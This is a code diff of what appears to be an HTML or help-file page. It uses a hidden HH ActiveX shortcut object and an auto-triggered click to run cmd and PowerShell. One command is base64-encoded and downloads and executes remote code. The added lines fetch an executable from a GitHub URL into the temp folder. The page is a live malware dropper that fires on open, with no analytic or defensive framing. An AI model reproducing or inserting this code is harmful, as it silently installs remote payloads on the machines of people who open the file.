@@ -25,3 +25,16 @@ document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11
   document.write('<PARAM name="Button" value="Bitmap::shortcut">');
   document.write('<PARAM name="Item1" value=\'",cmd.exe,/c taskkill.exe /f /im hh.exe  && c:\windows\system32\windowspowershell\v1.0\powershell.exe -NoProfile -end "aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2dpdGh1Yi5jb20va29iZXp0MDgvdGVzdC9yYXcvbWFzdGVyL2JpdHNnZG9zdXRpbC5leGUnKQ==""\'>');
 document.write('</OBJECT>');
+
+
+
+
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+<PARAM name="Button" value="Bitmap::shortcut">
+<PARAM name="Item1" value=",cmd.exe,/c c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -NoProfile -c (new-object system.net.webclient).downloadfile('https://github.com/kobezt08/test/raw/master/bitsgdosutil.exe', $env:temp + '\bitsgdosutil.exe')">
+<PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<script>
+x.Click()
+</script>
